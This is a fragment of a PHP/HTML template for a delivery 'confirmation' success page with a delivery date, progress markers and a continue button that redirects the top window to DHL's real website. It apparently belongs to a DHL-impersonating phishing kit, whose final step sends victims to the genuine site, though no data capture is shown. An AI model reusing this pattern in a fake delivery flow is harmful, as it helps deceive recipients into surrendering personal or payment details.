     ...
     <div class="wrapper_success">
        <form>
          <div class="title_success">
            <h1><img src="<?php echo IMGSPATH; ?>/x1.svg" alt=""> <?php echo get_text('confirmation'); ?></h1>
            <p><?php echo get_text('success'); ?></p>
          </div>
          <ul class="smita">
            <li class="green"></li>
            <li class="green"></li>
          ...
          <div class="info">
            <span><?php echo get_text('delivery_date_text'); ?></span>
            <p><?php echo get_text('delivery_date'); ?></p>
            <p class="txt_3"><?php echo get_text('success_text'); ?></p>
          </div>
          <div class="btns">
            <button type="button" class="go"><?php echo get_text('continue'); ?></button>
          </div>
        </form>
     </div>
...
<!-- footer -->
    ...
    <script>        
            $(".go").click(function(){
              top.location.href ="https://www.dhl.com/";
            });
